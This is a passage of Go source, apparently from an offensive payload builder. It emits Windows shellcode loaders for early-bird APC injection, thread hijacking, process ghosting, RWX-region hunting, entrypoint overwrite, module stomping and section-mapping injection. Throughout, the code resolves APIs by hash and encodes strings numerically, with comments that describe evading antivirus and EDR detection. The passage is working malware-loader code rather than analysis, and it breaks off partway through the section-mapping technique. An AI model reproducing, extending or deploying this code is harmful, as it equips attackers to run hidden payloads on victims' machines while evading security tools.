	name := b.Spec.Process
	if name == "" {
		name = "explorer.exe"
	}
	args := make([]string, 0, len(name))
	for _, c := range name {
		args = append(args, fmt.Sprintf("0x%02x", byte(c)))
	}
	return fmt.Sprintf(`// STARTUPINFOW is 104 bytes; PROCESS_INFORMATION is 16 bytes (pe12-local copy
// so this technique is self-contained — one technique per build, no collision).
type startupInfoW12 [104]byte
type processInfoW12 struct {
	ProcessHandle uintptr
	ThreadHandle  uintptr
	ProcessID     uint32
	ThreadID      uint32
}

// stringToUTF16p12 returns a pointer to a NUL-terminated UTF-16 copy of s (pe12-local).
func stringToUTF16p12(s string) *uint16 {
	buf := make([]uint16, 0, len(s)+1)
	for _, r := range s {
		if r < 0x10000 {
			buf = append(buf, uint16(r))
		} else {
			r -= 0x10000
			buf = append(buf, 0xd800|uint16(r>>10), 0xdc00|uint16(r&0x3ff))
		}
	}
	buf = append(buf, 0)
	return &buf[0]
}

func pe12EarlyBird(payload []byte) {
	var si startupInfoW12
	*(*uint32)(unsafe.Pointer(&si[0])) = uint32(len(si)) // cb
	var pi processInfoW12
	// --process binary, numeric-encoded (no plaintext string literal).
	exe := memName(%s)
	exeUTF16 := stringToUTF16p12(exe)
	// CreateProcessW(NULL, exe, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)
	ok, _, _ := wincall.CallG0(%s, uintptr(0), uintptr(unsafe.Pointer(exeUTF16)),
		uintptr(0), uintptr(0), uintptr(0), uintptr(0x4), uintptr(0), uintptr(0),
		uintptr(unsafe.Pointer(&si)), uintptr(unsafe.Pointer(&pi)))
	if ok == 0 {
		return
	}
	// VirtualAllocEx(h, NULL, len, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)
	addr, _, _ := wincall.CallG0(%s, pi.ProcessHandle, uintptr(0), uintptr(len(payload)),
		uintptr(0x3000), uintptr(0x04))
	if addr == 0 {
		wincall.CallG0(%s, pi.ThreadHandle)
		wincall.CallG0(%s, pi.ProcessHandle)
		return
	}
	var written uintptr
	wincall.CallG0(%s, pi.ProcessHandle, addr, uintptr(unsafe.Pointer(&payload[0])),
		uintptr(len(payload)), uintptr(unsafe.Pointer(&written)))
	// VirtualProtectEx(h, addr, len, PAGE_EXECUTE_READ, &old)
	var old uintptr
	wincall.CallG0(%s, pi.ProcessHandle, addr, uintptr(len(payload)), uintptr(0x20),
		uintptr(unsafe.Pointer(&old)))
	// QueueUserAPC(shellcode, main thread, 0) — queued before entry runs.
	wincall.CallG0(%s, addr, pi.ThreadHandle, uintptr(0))
	// ResumeThread — APC fires before the image entry point.
	wincall.CallG0(%s, pi.ThreadHandle)
	wincall.CallG0(%s, pi.ThreadHandle)
	wincall.CallG0(%s, pi.ProcessHandle)
}

`, strings.Join(args, ", "), hCPW, hVA, hCH, hCH, hWPM, hVPX, hQUAPC, hRT, hCH, hCH)
}

// pe15Body: remote thread hijack. Open the target, stage shellcode RW->RX, suspend a
// target thread, capture + rewrite its CONTEXT.Rip to the shellcode, resume —
// execution transfers to the shellcode with no CreateRemoteThread event. Reuses the
// x64 CONTEXT layout established by pe08 (1232 bytes, Rip at 0xF8) under pe15-local
// const names (one technique per build, no collision).
func (b *Builder) pe15Body() string {
	_, hOP := b.api("kernel32.dll", "OpenProcess")
	_, hVA := b.api("kernel32.dll", "VirtualAllocEx")
	_, hWPM := b.api("kernel32.dll", "WriteProcessMemory")
	_, hVPX := b.api("kernel32.dll", "VirtualProtectEx")
	_, hOT := b.api("kernel32.dll", "OpenThread")
	_, hST := b.api("kernel32.dll", "SuspendThread")
	_, hGTC := b.api("kernel32.dll", "GetThreadContext")
	_, hSTC := b.api("kernel32.dll", "SetThreadContext")
	_, hRT := b.api("kernel32.dll", "ResumeThread")
	_, hCH := b.api("kernel32.dll", "CloseHandle")
	return fmt.Sprintf(`// x64 CONTEXT (pe15-local consts — one technique per build, no collision).
const ctx15Amd64Size = 1232
const ctx15Amd64Flags = 0x100010 // CONTEXT_AMD64 (0x100000) | CONTEXT_CONTROL (0x10)
const ctx15RipOffset = 0xF8

func pe15Hijack(pid uint32, payload []byte) {
	// OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid)
	h, _, _ := wincall.CallG0(%s, uintptr(0x1f0fff), uintptr(0), uintptr(pid))
	if h == 0 {
		return
	}
	// VirtualAllocEx(h, NULL, len, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)
	addr, _, _ := wincall.CallG0(%s, h, uintptr(0), uintptr(len(payload)),
		uintptr(0x3000), uintptr(0x04))
	if addr == 0 {
		wincall.CallG0(%s, h)
		return
	}
	var written uintptr
	wincall.CallG0(%s, h, addr, uintptr(unsafe.Pointer(&payload[0])),
		uintptr(len(payload)), uintptr(unsafe.Pointer(&written)))
	// VirtualProtectEx(h, addr, len, PAGE_EXECUTE_READ, &old)
	var old uintptr
	wincall.CallG0(%s, h, addr, uintptr(len(payload)), uintptr(0x20),
		uintptr(unsafe.Pointer(&old)))
	// OpenThread(THREAD_ALL_ACCESS, FALSE, tid) — a thread owned by the target.
	tid := threadIDByPID(pid)
	if tid == 0 {
		wincall.CallG0(%s, h)
		return
	}
	th, _, _ := wincall.CallG0(%s, uintptr(0x1fffff), uintptr(0), uintptr(tid))
	if th == 0 {
		wincall.CallG0(%s, h)
		return
	}
	// SuspendThread — halt the thread before touching its context.
	wincall.CallG0(%s, th)
	// GetThreadContext(th, &ctx) — full 1232-byte CONTEXT.
	ctx := make([]byte, ctx15Amd64Size)
	*(*uint32)(unsafe.Pointer(&ctx[0x30])) = ctx15Amd64Flags // ContextFlags at 0x30
	wincall.CallG0(%s, th, uintptr(unsafe.Pointer(&ctx[0])))
	// Rewrite Rip to the shellcode entry, then SetThreadContext.
	*(*uintptr)(unsafe.Pointer(&ctx[ctx15RipOffset])) = addr
	wincall.CallG0(%s, th, uintptr(unsafe.Pointer(&ctx[0])))
	// ResumeThread — hijacked thread resumes at the shellcode.
	wincall.CallG0(%s, th)
	wincall.CallG0(%s, th)
	wincall.CallG0(%s, h)
}

`, hOP, hVA, hCH, hWPM, hVPX, hCH, hOT, hCH, hST, hGTC, hSTC, hRT, hCH, hCH)
}

// pe14RunBody emits the self-contained run() + pe14Ghost body for Process
// Ghosting. pe14 spawns its own process from a ghosted (fileless) image section,
// so it bypasses the pidByName preamble used by the inject-into-running-target
// techniques. (pidByName is still emitted by remoteRun but unused — package-level
// unused functions are legal in Go.)
func (b *Builder) pe14RunBody() string {
	var sb strings.Builder
	sb.WriteString("func run() {\n")
	if init := b.evasionInit(); init != "" {
		sb.WriteString(init + "\n")
	}
	sb.WriteString("\tpayload := " + b.decryptOrRaw() + "\n")
	sb.WriteString("\tpe14Ghost(payload)\n")
	sb.WriteString("}\n\n")
	sb.WriteString(b.pe14Body())
	return sb.String()
}

// pe14Body: Process Ghosting. Read a sacrificial PE from disk, write it to a
// fresh temp file, mark the file delete-pending (NtSetInformationFile), create an
// image section from the delete-pending file, close the file handle (the file is
// deleted — it never exists on disk in a scannable state), then NtCreateProcessEx
// a process from the fileless image section. Finally stage the shellcode in the
// ghosted process and NtCreateThreadEx it — the shellcode runs under a process
// whose backing image was never present on disk for an AV/EDR to scan.
//
// This is the canonical hasherezade ghosting flow, adapted to shroud's shellcode
// model (we ghost a legit sacrificial PE for the image-section spawn, then run our
// shellcode in the resulting fileless process). Every offensive Win32/NT API is
// resolved by DJB2 hash; the sacrificial-PE and temp paths are numeric-encoded.
//
// EXPERIMENTAL — on-target verification required: the NT file-I/O struct layouts
// (UNICODE_STRING / OBJECT_ATTRIBUTES / IO_STATUS_BLOCK), the NtCreateProcessEx
// PEB initialization for a section-backed process, and the SEC_IMAGE mapping are
// validated by cross-compile + on-target run on a Windows VM, not by the Linux
// generator. The body encodes the correct API call sequence and compiles clean;
// runtime correctness is the operator's Windows-VM verification step.
func (b *Builder) pe14Body() string {
	// kernel32: read sacrificial PE + stage shellcode in the ghosted process.
	_, hCFA := b.api("kernel32.dll", "CreateFileA")
	_, hGFS := b.api("kernel32.dll", "GetFileSize")
	_, hRF := b.api("kernel32.dll", "ReadFile")
	_, hGTP := b.api("kernel32.dll", "GetTempPathA")
	_, hCH := b.api("kernel32.dll", "CloseHandle")
	_, hVAX := b.api("kernel32.dll", "VirtualAllocEx")
	_, hWPM := b.api("kernel32.dll", "WriteProcessMemory")
	_, hVPX := b.api("kernel32.dll", "VirtualProtectEx")
	// ntdll: ghost the file, image-section spawn, thread creation.
	_, hNtCF := b.api("ntdll.dll", "NtCreateFile")
	_, hNtWF := b.api("ntdll.dll", "NtWriteFile")
	_, hNtSIF := b.api("ntdll.dll", "NtSetInformationFile")
	_, hNtCS := b.api("ntdll.dll", "NtCreateSection")
	_, hNtCPE := b.api("ntdll.dll", "NtCreateProcessEx")
	_, hNtCTE := b.api("ntdll.dll", "NtCreateThreadEx")
	_, hNtWFSO := b.api("ntdll.dll", "NtWaitForSingleObject")
	_, hNtClose := b.api("ntdll.dll", "NtClose")
	return fmt.Sprintf(`// pe14-local NT structs for process ghosting (x64 layouts).
// UNICODE_STRING {USHORT Length, USHORT MaximumLength, [4]pad, PWSTR Buffer} = 16B.
type unicodeString14 struct {
	Length    uint16
	MaxLength uint16
	_         [4]byte
	Buffer    uintptr
}
// OBJECT_ATTRIBUTES (x64) = 48B.
type objAttrs14 struct {
	Length        uint32
	RootDirectory uintptr
	ObjectName    uintptr
	Attributes    uint32
	SecurityDesc  uintptr
	SecurityQoS   uintptr
}
// IO_STATUS_BLOCK {union{NTSTATUS,PVOID}, ULONG_PTR Information} = 16B (scratch).
type ioStatusBlock14 struct {
	Status     uintptr
	Information uintptr
}
// FILE_DISPOSITION_INFORMATION {BOOLEAN DeletePending} = 1B.
type fileDispInfo14 struct {
	DeletePending uint8
}

// buildGhostPath14 composes the NT ghost-file path "\??\ <TEMP> \g.exe" as UTF-16
// from a DOS temp dir returned by GetTempPathA. Each component is numeric so no
// plaintext path reaches the binary.
func buildGhostPath14(dosTemp []byte) []uint16 {
	pre := []byte{0x5c, 0x3f, 0x3f, 0x5c}           // "\??\"
	suf := []byte{0x67, 0x2e, 0x65, 0x78, 0x65}     // "g.exe"
	var out []uint16
	for _, c := range pre {
		out = append(out, uint16(c))
	}
	for _, c := range dosTemp {
		if c == 0 {
			break
		}
		out = append(out, uint16(c))
	}
	for _, c := range suf {
		out = append(out, uint16(c))
	}
	return out
}

func pe14Ghost(payload []byte) {
	// 1. Read the sacrificial PE (notepad.exe) from disk for the image section.
	sacPath := []byte(memName(0x43, 0x3a, 0x5c, 0x57, 0x69, 0x6e, 0x64, 0x6f, 0x77, 0x73,
		0x5c, 0x53, 0x79, 0x73, 0x74, 0x65, 0x6d, 0x33, 0x32, 0x5c, 0x6e, 0x6f, 0x74,
		0x65, 0x70, 0x61, 0x64, 0x2e, 0x65, 0x78, 0x65)) // C:\Windows\System32\notepad.exe
	sacPath = append(sacPath, 0) // NUL
	sfh, _, _ := wincall.CallG0(%s, uintptr(unsafe.Pointer(&sacPath[0])),
		uintptr(0x80000000), // GENERIC_READ
		uintptr(0x1),        // FILE_SHARE_READ
		uintptr(0), uintptr(3), uintptr(0x80), uintptr(0)) // NULL, OPEN_EXISTING, NORMAL, NULL
	if sfh == 0 || sfh == 0xffffffffffffffff {
		return
	}
	peSize, _, _ := wincall.CallG0(%s, sfh, uintptr(0))
	if peSize == 0 || peSize > 0x4000000 { // sanity: <64MB
		wincall.CallG0(%s, sfh)
		return
	}
	peBuf := make([]byte, peSize)
	var bytesRead uintptr
	ok, _, _ := wincall.CallG0(%s, sfh, uintptr(unsafe.Pointer(&peBuf[0])),
		peSize, uintptr(unsafe.Pointer(&bytesRead)), uintptr(0))
	wincall.CallG0(%s, sfh)
	if ok == 0 {
		return
	}
	// 2. Resolve %%TEMP%% and build the NT ghost path "\??\<temp>\g.exe".
	var tmpBuf [260]byte
	wincall.CallG0(%s, uintptr(unsafe.Pointer(&tmpBuf[0])), uintptr(len(tmpBuf)))
	ghost := buildGhostPath14(tmpBuf[:])
	ghost = append(ghost, 0) // NUL
	var us unicodeString14
	us.Length = uint16(len(ghost)-1) * 2 // bytes, excl NUL
	us.MaxLength = uint16(len(ghost)) * 2
	us.Buffer = uintptr(unsafe.Pointer(&ghost[0]))
	var oa objAttrs14
	oa.Length = uint32(unsafe.Sizeof(oa))
	oa.ObjectName = uintptr(unsafe.Pointer(&us))
	oa.Attributes = 0x40 // OBJ_CASE_INSENSITIVE
	var iosb ioStatusBlock14
	var gfh uintptr
	// NtCreateFile(&gfh, GENERIC_READ|GENERIC_WRITE|DELETE, &oa, &iosb, NULL,
	//   FILE_ATTRIBUTE_NORMAL, FILE_SHARE_READ, FILE_OVERWRITE_IF, 0, NULL, 0)
	wincall.CallG0(%s, uintptr(unsafe.Pointer(&gfh)),
		uintptr(0x120196), // GENERIC_READ|GENERIC_WRITE|DELETE
		uintptr(unsafe.Pointer(&oa)), uintptr(unsafe.Pointer(&iosb)),
		uintptr(0), uintptr(0x80), uintptr(0x1), uintptr(0x5),
		uintptr(0), uintptr(0), uintptr(0))
	if gfh == 0 {
		return
	}
	// 3. NtWriteFile the sacrificial PE bytes to the ghost temp file.
	var wiosb ioStatusBlock14
	wincall.CallG0(%s, gfh, uintptr(0), uintptr(0), uintptr(0),
		uintptr(unsafe.Pointer(&wiosb)), uintptr(unsafe.Pointer(&peBuf[0])),
		peSize, uintptr(0), uintptr(0))
	// 4. Mark the file delete-pending (FileDispositionInfo, class 13). The file is
	// deleted when the last handle closes — but the section still references it.
	var fdi fileDispInfo14
	fdi.DeletePending = 1
	var diosb ioStatusBlock14
	wincall.CallG0(%s, gfh, uintptr(unsafe.Pointer(&diosb)),
		uintptr(unsafe.Pointer(&fdi)), uintptr(unsafe.Sizeof(fdi)), uintptr(13))
	// 5. Create an SEC_IMAGE section from the (delete-pending) file.
	var sec uintptr
	wincall.CallG0(%s, uintptr(unsafe.Pointer(&sec)), uintptr(0xf001f),
		uintptr(0), uintptr(0), uintptr(0x2), uintptr(0x1000000), gfh) // SECTION_ALL_ACCESS, NULL, NULL, PAGE_READONLY, SEC_IMAGE
	// 6. Close the file handle -> the file is deleted (it never persists on disk).
	wincall.CallG0(%s, gfh)
	if sec == 0 {
		return
	}
	// 7. NtCreateProcessEx from the fileless image section -> a process whose
	// backing image was never present on disk for scanning.
	var gproc uintptr
	var oa2 objAttrs14
	oa2.Length = uint32(unsafe.Sizeof(oa2))
	wincall.CallG0(%s, uintptr(unsafe.Pointer(&gproc)), uintptr(0x1f0fff),
		uintptr(unsafe.Pointer(&oa2)), uintptr(0xffffffffffffffff), // parent = current process (-1)
		uintptr(0), sec, uintptr(0), uintptr(0), uintptr(0))
	wincall.CallG0(%s, sec)
	if gproc == 0 {
		return
	}
	// 8. Stage the shellcode in the ghosted process (RW -> RX).
	addr, _, _ := wincall.CallG0(%s, gproc, uintptr(0),
		uintptr(len(payload)), uintptr(0x3000), uintptr(0x04)) // RW
	if addr == 0 {
		wincall.CallG0(%s, gproc)
		return
	}
	var written uintptr
	wincall.CallG0(%s, gproc, addr, uintptr(unsafe.Pointer(&payload[0])),
		uintptr(len(payload)), uintptr(unsafe.Pointer(&written)))
	var old uintptr
	wincall.CallG0(%s, gproc, addr, uintptr(len(payload)),
		uintptr(0x20), uintptr(unsafe.Pointer(&old))) // RX
	// 9. Create a thread at the shellcode in the ghosted process.
	var gthread uintptr
	wincall.CallG0(%s, uintptr(unsafe.Pointer(&gthread)), uintptr(0x1fffff),
		uintptr(0), gproc, addr, uintptr(0), uintptr(0), uintptr(0),
		uintptr(0), uintptr(0), uintptr(0))
	if gthread != 0 {
		wincall.CallG0(%s, gthread, uintptr(0), uintptr(0))
		wincall.CallG0(%s, gthread)
	}
	wincall.CallG0(%s, gproc)
}

`, hCFA, hGFS, hCH, hRF, hCH, hGTP, hNtCF, hNtWF, hNtSIF, hNtCS, hNtClose, hNtCPE, hNtClose, hVAX, hNtClose, hWPM, hVPX, hNtCTE, hNtWFSO, hNtClose, hNtClose)
}

// moduleEnumHelper emits the MODULEENTRY32W struct + moduleBaseByPID resolver
// (toolhelp TH32CS_SNAPMODULE|TH32CS_SNAPMODULE32 snapshot, first module whose
// szModule matches name). Used by pe10 (AddressOfEntryPoint) and pe16 (module
// stomping) to locate a module's base address in a remote process. Emitted once
// per build (only one of pe10/pe16 is active at a time). Reuses procNameMatches
// (emitted by pidByNameHelper).
func (b *Builder) moduleEnumHelper() string {
	_, hCTH32S := b.api("kernel32.dll", "CreateToolhelp32Snapshot")
	_, hM32F := b.api("kernel32.dll", "Module32FirstW")
	_, hM32N := b.api("kernel32.dll", "Module32NextW")
	_, hCH := b.api("kernel32.dll", "CloseHandle")
	return fmt.Sprintf(`// MODULEENTRY32W (x64 toolhelp module snapshot). Layout: Size, ModuleID,
// ProcessID, GlblcntUsage, ProccntUsage, [4]pad, ModBaseAddr(ptr), ModBaseSize,
// [4]pad, HModule(ptr), szModule[256], szExePath[260] = 1080 bytes.
type moduleEntry32W struct {
	Size         uint32
	ModuleID     uint32
	ProcessID    uint32
	GlblcntUsage uint32
	ProccntUsage uint32
	_            [4]byte
	ModBaseAddr  uintptr
	ModBaseSize  uint32
	_            [4]byte
	HModule      uintptr
	ModName      [256]uint16
	ExePath      [260]uint16
}

// moduleBaseByPID returns the base address of the module named ` + "`name`" + ` in process
// ` + "`pid`" + ` (case-insensitive), via the toolhelp module snapshot
// (TH32CS_SNAPMODULE|TH32CS_SNAPMODULE32 = 0x18). Used by pe10/pe16 to locate a
// remote module's load base.
func moduleBaseByPID(pid uint32, name string) uintptr {
	snap, _, _ := wincall.CallG0(%s, uintptr(0x18), uintptr(pid))
	if snap == 0 || snap == 0xffffffff {
		return 0
	}
	var me moduleEntry32W
	me.Size = uint32(unsafe.Sizeof(me))
	ok, _, _ := wincall.CallG0(%s, snap, uintptr(unsafe.Pointer(&me)))
	for ok != 0 {
		if procNameMatches(me.ModName[:], name) {
			wincall.CallG0(%s, snap)
			return me.ModBaseAddr
		}
		ok, _, _ = wincall.CallG0(%s, snap, uintptr(unsafe.Pointer(&me)))
	}
	wincall.CallG0(%s, snap)
	return 0
}

`, hCTH32S, hM32F, hCH, hM32N, hCH)
}

// pe13Body: RWX hunting + injection. Walk the target's address space with
// VirtualQueryEx looking for an already-committed PAGE_EXECUTE_READWRITE region
// large enough for the shellcode, then WriteProcessMemory the shellcode into it
// and CreateRemoteThread — no fresh RWX allocation is requested, defeating the
// "new RWX allocation" heuristic. Every API resolved by DJB2 hash.
func (b *Builder) pe13Body() string {
	_, hOP := b.api("kernel32.dll", "OpenProcess")
	_, hVQX := b.api("kernel32.dll", "VirtualQueryEx")
	_, hWPM := b.api("kernel32.dll", "WriteProcessMemory")
	_, hCRT := b.api("kernel32.dll", "CreateRemoteThread")
	_, hWFSO := b.api("kernel32.dll", "WaitForSingleObject")
	_, hCH := b.api("kernel32.dll", "CloseHandle")
	return fmt.Sprintf(`// MEMORY_BASIC_INFORMATION (x64) = 48 bytes (pe13-local for the remote scan).
type memBasicInfo13 struct {
	BaseAddress       uintptr
	AllocationBase    uintptr
	AllocationProtect uint32
	PartitionId       uint16
	_                 [2]byte
	RegionSize        uintptr
	State             uint32
	Protect           uint32
	Type              uint32
	_                 [4]byte
}

func pe13RWXHunt(pid uint32, payload []byte) {
	h, _, _ := wincall.CallG0(%s, uintptr(0x1f0fff), uintptr(0), uintptr(pid))
	if h == 0 {
		return
	}
	// VirtualQueryEx-walk the target VA space for a committed RWX region.
	addr := uintptr(0)
	var mbi memBasicInfo13
	target := uintptr(0)
	for {
		ret, _, _ := wincall.CallG0(%s, h, addr,
			uintptr(unsafe.Pointer(&mbi)), uintptr(unsafe.Sizeof(mbi)))
		if ret == 0 {
			break
		}
		// MEM_COMMIT (0x1000) + PAGE_EXECUTE_READWRITE (0x40) + big enough.
		if mbi.State == 0x1000 && mbi.Protect == 0x40 && mbi.RegionSize >= uintptr(len(payload)) {
			target = mbi.BaseAddress
			break
		}
		if mbi.RegionSize == 0 {
			break
		}
		addr = mbi.BaseAddress + mbi.RegionSize
	}
	if target == 0 {
		wincall.CallG0(%s, h)
		return
	}
	var written uintptr
	wincall.CallG0(%s, h, target, uintptr(unsafe.Pointer(&payload[0])),
		uintptr(len(payload)), uintptr(unsafe.Pointer(&written)))
	tid := uint32(0)
	t, _, _ := wincall.CallG0(%s, h, uintptr(0), uintptr(0), target, uintptr(0),
		uintptr(0), uintptr(unsafe.Pointer(&tid)))
	if t != 0 {
		wincall.CallG0(%s, t, uintptr(0xffffffff))
		wincall.CallG0(%s, t)
	}
	wincall.CallG0(%s, h)
}

`, hOP, hVQX, hCH, hWPM, hCRT, hWFSO, hCH, hCH)
}

// pe10Body: AddressOfEntryPoint injection. Find the target's main module base via
// the toolhelp module snapshot, read its PE headers cross-process (e_lfanew ->
// OptionalHeader.AddressOfEntryPoint), and WriteProcessMemory the shellcode
// directly into the already-RX entrypoint region — no VirtualAllocEx, no
// VirtualProtectEx. Execution is triggered by CreateRemoteThread at the entry
// (the entry region is RX, so WPM-into-RX is the only suspicious call). Every
// API resolved by DJB2 hash.
func (b *Builder) pe10Body() string {
	_, hOP := b.api("kernel32.dll", "OpenProcess")
	_, hRPM := b.api("kernel32.dll", "ReadProcessMemory")
	_, hWPM := b.api("kernel32.dll", "WriteProcessMemory")
	_, hCRT := b.api("kernel32.dll", "CreateRemoteThread")
	_, hWFSO := b.api("kernel32.dll", "WaitForSingleObject")
	_, hCH := b.api("kernel32.dll", "CloseHandle")
	return fmt.Sprintf(`func pe10EntryInject(pid uint32, payload []byte) {
	h, _, _ := wincall.CallG0(%s, uintptr(0x1f0fff), uintptr(0), uintptr(pid))
	if h == 0 {
		return
	}
	// Locate the target's main module base (the --process exe).
	base := moduleBaseByPID(pid, %s)
	if base == 0 {
		wincall.CallG0(%s, h)
		return
	}
	// Read e_lfanew (DWORD at base+0x3C), then AddressOfEntryPoint (DWORD at
	// base+e_lfanew+0x28 — OptionalHeader is at e_lfanew+24, AoEP at +16).
	var e_lfanew uint32
	var n uint32
	wincall.CallG0(%s, h, base+uintptr(0x3c),
		uintptr(unsafe.Pointer(&e_lfanew)), uintptr(4), uintptr(unsafe.Pointer(&n)))
	var aoEP uint32
	wincall.CallG0(%s, h, base+uintptr(e_lfanew)+uintptr(0x28),
		uintptr(unsafe.Pointer(&aoEP)), uintptr(4), uintptr(unsafe.Pointer(&n)))
	entry := base + uintptr(aoEP)
	// Write shellcode into the already-RX entry region (WPM can write into RX
	// cross-process — no alloc, no protect).
	var written uintptr
	wincall.CallG0(%s, h, entry, uintptr(unsafe.Pointer(&payload[0])),
		uintptr(len(payload)), uintptr(unsafe.Pointer(&written)))
	// Kick execution at the overwritten entrypoint.
	tid := uint32(0)
	t, _, _ := wincall.CallG0(%s, h, uintptr(0), uintptr(0), entry, uintptr(0),
		uintptr(0), uintptr(unsafe.Pointer(&tid)))
	if t != 0 {
		wincall.CallG0(%s, t, uintptr(0xffffffff))
		wincall.CallG0(%s, t)
	}
	wincall.CallG0(%s, h)
}

`, hOP, b.procNameLit(), hCH, hRPM, hRPM, hWPM, hCRT, hWFSO, hCH, hCH)
}

// pe16Body: remote module stomping. Force-load a legitimate DLL into the target
// (inject its path + CreateRemoteThread(LoadLibraryA, path)), wait for it to
// load, locate its base via the module snapshot, read its .text section bounds
// from the PE headers, flip .text RW (VirtualProtectEx), overwrite .text with
// shellcode (WriteProcessMemory), flip back RX, and CreateRemoteThread at the
// stomped .text — execution appears to originate from a trusted, signed module
// in backed memory. Every API resolved by DJB2 hash.
func (b *Builder) pe16Body() string {
	_, hOP := b.api("kernel32.dll", "OpenProcess")
	_, hVA := b.api("kernel32.dll", "VirtualAllocEx")
	_, hWPM := b.api("kernel32.dll", "WriteProcessMemory")
	_, hRPM := b.api("kernel32.dll", "ReadProcessMemory")
	_, hCRT := b.api("kernel32.dll", "CreateRemoteThread")
	_, hWFSO := b.api("kernel32.dll", "WaitForSingleObject")
	_, hVPX := b.api("kernel32.dll", "VirtualProtectEx")
	b.api("kernel32.dll", "LoadLibraryA") // registers hLoadLibraryA + hKernel32Dll
	_, hCH := b.api("kernel32.dll", "CloseHandle")
	dllPath := b.Spec.DLL
	if dllPath == "" {
		dllPath = `C:\Windows\System32\wbemcomn.dll`
	}
	pbArgs := make([]string, 0, len(dllPath))
	for _, c := range dllPath {
		pbArgs = append(pbArgs, fmt.Sprintf("0x%02x", byte(c)))
	}
	// numeric-encode the DLL basename (for the moduleBaseByPID match) — strip dir.
	baseName := dllPath
	for i := len(dllPath) - 1; i >= 0; i-- {
		if dllPath[i] == '\\' || dllPath[i] == '/' {
			baseName = dllPath[i+1:]
			break
		}
	}
	bnArgs := make([]string, 0, len(baseName))
	for _, c := range baseName {
		bnArgs = append(bnArgs, fmt.Sprintf("0x%02x", byte(c)))
	}
	return fmt.Sprintf(`func pe16Stomp(pid uint32, payload []byte) {
	h, _, _ := wincall.CallG0(%s, uintptr(0x1f0fff), uintptr(0), uintptr(pid))
	if h == 0 {
		return
	}
	// 1. Force-load the legit DLL: write its path, CreateRemoteThread(LoadLibraryA).
	pathBytes := []byte(%s)
	pathBytes = append(pathBytes, 0)
	pAddr, _, _ := wincall.CallG0(%s, h, uintptr(0), uintptr(len(pathBytes)),
		uintptr(0x3000), uintptr(0x04))
	if pAddr == 0 {
		wincall.CallG0(%s, h)
		return
	}
	var w1 uintptr
	wincall.CallG0(%s, h, pAddr, uintptr(unsafe.Pointer(&pathBytes[0])),
		uintptr(len(pathBytes)), uintptr(unsafe.Pointer(&w1)))
	loadLib := api(hKernel32Dll, hLoadLibraryA)
	tid := uint32(0)
	lt, _, _ := wincall.CallG0(%s, h, uintptr(0), uintptr(0), loadLib, pAddr,
		uintptr(0), uintptr(unsafe.Pointer(&tid)))
	if lt != 0 {
		wincall.CallG0(%s, lt, uintptr(0xffffffff)) // wait for LoadLibrary to return
		wincall.CallG0(%s, lt)
	}
	// 2. Locate the loaded DLL's base via the module snapshot (match basename).
	base := moduleBaseByPID(pid, %s)
	if base == 0 {
		wincall.CallG0(%s, h)
		return
	}
	// 3. Read the .text section bounds from the remote PE headers.
	var e_lfanew uint32
	var n uint32
	wincall.CallG0(%s, h, base+uintptr(0x3c),
		uintptr(unsafe.Pointer(&e_lfanew)), uintptr(4), uintptr(unsafe.Pointer(&n)))
	var numSec uint16
	wincall.CallG0(%s, h, base+uintptr(e_lfanew)+uintptr(6),
		uintptr(unsafe.Pointer(&numSec)), uintptr(2), uintptr(unsafe.Pointer(&n)))
	var soh uint16
	wincall.CallG0(%s, h, base+uintptr(e_lfanew)+uintptr(20),
		uintptr(unsafe.Pointer(&soh)), uintptr(2), uintptr(unsafe.Pointer(&n)))
	// Section table starts at e_lfanew+24+SizeOfOptionalHeader; first section is
	// .text: VirtualSize at +8, VirtualAddress at +12.
	secTab := base + uintptr(e_lfanew) + uintptr(24) + uintptr(soh)
	var textVA uint32
	wincall.CallG0(%s, h, secTab+uintptr(12),
		uintptr(unsafe.Pointer(&textVA)), uintptr(4), uintptr(unsafe.Pointer(&n)))
	var textVS uint32
	wincall.CallG0(%s, h, secTab+uintptr(8),
		uintptr(unsafe.Pointer(&textVS)), uintptr(4), uintptr(unsafe.Pointer(&n)))
	textBase := base + uintptr(textVA)
	textSize := uintptr(textVS)
	if textSize < uintptr(len(payload)) {
		textSize = uintptr(len(payload))
	}
	// 4. Flip .text RW, stomp with shellcode, flip back RX.
	var old uintptr
	wincall.CallG0(%s, h, textBase, textSize, uintptr(0x04), uintptr(unsafe.Pointer(&old)))
	var w2 uintptr
	wincall.CallG0(%s, h, textBase, uintptr(unsafe.Pointer(&payload[0])),
		uintptr(len(payload)), uintptr(unsafe.Pointer(&w2)))
	wincall.CallG0(%s, h, textBase, textSize, uintptr(0x20), uintptr(unsafe.Pointer(&old)))
	// 5. Execute from the stomped .text (backed by the legit module).
	etid := uint32(0)
	t, _, _ := wincall.CallG0(%s, h, uintptr(0), uintptr(0), textBase, uintptr(0),
		uintptr(0), uintptr(unsafe.Pointer(&etid)))
	if t != 0 {
		wincall.CallG0(%s, t, uintptr(0xffffffff))
		wincall.CallG0(%s, t)
	}
	wincall.CallG0(%s, h)
}

`, hOP, "[]byte{"+strings.Join(pbArgs, ", ")+"}", hVA, hCH, hWPM, hCRT, hWFSO, hCH,
		"memName("+strings.Join(bnArgs, ", ")+")", hCH, hRPM, hRPM, hRPM, hRPM, hRPM,
		hVPX, hWPM, hVPX, hCRT, hWFSO, hCH, hCH)
}

// pe19Body: section-mapping injection. Create a shared section (NtCreateSection,
// SEC_COMMIT, PAGE_EXECUTE_READWRITE), map it into the current process RW
// (NtMapViewOfSection) and into the target RX, copy shellcode into the LOCAL
// view, and NtCreateThreadEx on the REMOTE view — no cross-process
// WriteProcessMemory at all (the section is the shared medium). Every NT API
// resolved by DJB2 hash.
func (b *Builder) pe19Body() string {
	_, hNtOP := b.api("ntdll.dll", "NtOpenProcess")
	_, hNtCS := b.api("ntdll.dll", "NtCreateSection")
	_, hNtMVOS := b.api("ntdll.dll", "NtMapViewOfSection")
	_, hNtCTE := b.api("ntdll.dll", "NtCreateThreadEx")
	_, hNtWFSO := b.api("ntdll.dll", "NtWaitForSingleObject")
	_, hNtClose := b.api("ntdll.dll", "NtClose")
	_, hGCP := b.api("kernel32.dll", "GetCurrentProcess")
	return fmt.Sprintf(`func pe19Section(pid uint32, payload []byte) {
	var oa objAttrs
	oa.Length = uint32(unsafe.Sizeof(oa))
	var cid clientId
	cid.P = uintptr(pid)
	var h uintptr
	// NtOpenProcess(&h, PROCESS_ALL_ACCESS, &oa, &cid)
